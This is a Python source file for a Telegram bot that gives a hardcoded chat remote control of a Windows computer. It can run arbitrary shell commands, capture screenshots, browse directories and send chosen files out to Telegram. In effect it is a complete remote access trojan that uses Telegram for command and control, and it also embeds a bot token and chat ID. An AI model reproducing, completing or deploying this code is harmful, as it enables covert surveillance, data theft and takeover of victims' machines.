import os
import subprocess
from telegram import Bot, Update, InputFile
from telegram.ext import Application, CommandHandler, CallbackContext
import pyautogui

# Telegram Bot Token
TELEGRAM_TOKEN = "7743864679:AAE4A054aV7Be32zQ68ZXSsIk8l1dajjJGo"
AUTHORIZED_CHAT_IDS = ["-1002253051647"]  # Your chat ID

bot = Bot(token=TELEGRAM_TOKEN)

# Create Application instance
application = Application.builder().token(TELEGRAM_TOKEN).build()

commands = "\n".join([
    "/help - Help command",
    "/ping - Ping command",
    "/cwd - Get current working directory",
    "/cd <directory> - Change directory",
    "/ls - List directory",
    "/download <file> - Download file",
    "/screenshot - Take a screenshot",
    "/shell <command> - Execute shell command",
])

# Helper Functions
def get_processor():
    return subprocess.getoutput("wmic cpu get name").split("\n")[1].strip()

def get_gpu():
    return subprocess.getoutput("wmic path win32_videocontroller get caption").split("\n")[1].strip()

def get_os():
    return subprocess.getoutput("wmic os get caption").split("\n")[1].strip()

# Command Handlers
async def start(update: Update, context: CallbackContext):
    if str(update.effective_chat.id) not in AUTHORIZED_CHAT_IDS:
        await update.message.reply_text("❌ You are not authorized to use this bot.")
        return
    system_info = f"""
    OS: {get_os()}
    CPU: {get_processor()}
    GPU: {get_gpu()}
    """
    await update.message.reply_text(f"🤖 Bot started! Here are the commands:\n{commands}\n\nSystem Info:\n{system_info}")

async def help_command(update: Update, context: CallbackContext):
    if str(update.effective_chat.id) not in AUTHORIZED_CHAT_IDS:
        await update.message.reply_text("❌ You are not authorized to use this bot.")
        return
    await update.message.reply_text(f"🤖 Available commands:\n{commands}")

async def ping(update: Update, context: CallbackContext):
    if str(update.effective_chat.id) not in AUTHORIZED_CHAT_IDS:
        await update.message.reply_text("❌ You are not authorized to use this bot.")
        return
    await update.message.reply_text("🏓 Pong!")

async def cwd(update: Update, context: CallbackContext):
    if str(update.effective_chat.id) not in AUTHORIZED_CHAT_IDS:
        await update.message.reply_text("❌ You are not authorized to use this bot.")
        return
    await update.message.reply_text(f"📂 Current Directory:\n{os.getcwd()}")

async def cd(update: Update, context: CallbackContext):
    if str(update.effective_chat.id) not in AUTHORIZED_CHAT_IDS:
        await update.message.reply_text("❌ You are not authorized to use this bot.")
        return
    try:
        directory = " ".join(context.args)
        os.chdir(directory)
        await update.message.reply_text(f"📂 Changed to Directory:\n{os.getcwd()}")
    except Exception as e:
        await update.message.reply_text(f"❌ Error:\n{str(e)}")

async def ls(update: Update, context: CallbackContext):
    if str(update.effective_chat.id) not in AUTHORIZED_CHAT_IDS:
        await update.message.reply_text("❌ You are not authorized to use this bot.")
        return
    try:
        files = "\n".join(os.listdir())
        await update.message.reply_text(f"📄 Files:\n{files}")
    except Exception as e:
        await update.message.reply_text(f"❌ Error:\n{str(e)}")

async def download(update: Update, context: CallbackContext):
    if str(update.effective_chat.id) not in AUTHORIZED_CHAT_IDS:
        await update.message.reply_text("❌ You are not authorized to use this bot.")
        return
    try:
        file_path = " ".join(context.args)
        
        if not os.path.exists(file_path):
            await update.message.reply_text("❌ File not found.")
            return
        
        # Send the file using InputFile, specifying the correct filename
        file = InputFile(file_path, filename=os.path.basename(file_path))
        await bot.send_document(chat_id=update.message.chat_id, document=file)
    except Exception as e:
        await update.message.reply_text(f"❌ Error:\n{str(e)}")


async def screenshot(update: Update, context: CallbackContext):
    if str(update.effective_chat.id) not in AUTHORIZED_CHAT_IDS:
        await update.message.reply_text("❌ You are not authorized to use this bot.")
        return
    try:
        # Define file path
        path = os.path.join(os.getenv("TEMP"), "screenshot.png")
        
        # Capture the screenshot
        screenshot = pyautogui.screenshot()

        # Save the screenshot to the specified file path
        screenshot.save(path)

        # Verify the file was saved
        if not os.path.exists(path):
            await update.message.reply_text("❌ Screenshot file does not exist.")
            return
        
        # Send the screenshot file to the chat
        file = InputFile(path, filename="screenshot.png")
        await bot.send_document(chat_id=update.message.chat_id, document=file)

        # Clean up the screenshot file after sending
        os.remove(path)

    except Exception as e:
        await update.message.reply_text(f"❌ Error while capturing screenshot: {str(e)}")

async def shell(update: Update, context: CallbackContext):
    if str(update.effective_chat.id) not in AUTHORIZED_CHAT_IDS:
        await update.message.reply_text("❌ You are not authorized to use this bot.")
        return
    try:
        command = " ".join(context.args)
        output = subprocess.getoutput(command)
        if len(output) > 4000:
            path = os.path.join(os.getenv("TEMP"), "output.txt")
            with open(path, "w") as f:
                f.write(output)
            file = InputFile(path)
            await bot.send_document(chat_id=update.message.chat_id, document=file)
        else:
            await update.message.reply_text(f"💻 Shell Output:\n{output}")
    except Exception as e:
        await update.message.reply_text(f"❌ Error:\n{str(e)}")

# Attach handlers
application.add_handler(CommandHandler("start", start))
application.add_handler(CommandHandler("help", help_command))
application.add_handler(CommandHandler("ping", ping))
application.add_handler(CommandHandler("cwd", cwd))
application.add_handler(CommandHandler("cd", cd))
application.add_handler(CommandHandler("ls", ls))
application.add_handler(CommandHandler("download", download))
application.add_handler(CommandHandler("screenshot", screenshot))
application.add_handler(CommandHandler("shell", shell))

# Start the Bot
application.run_polling()
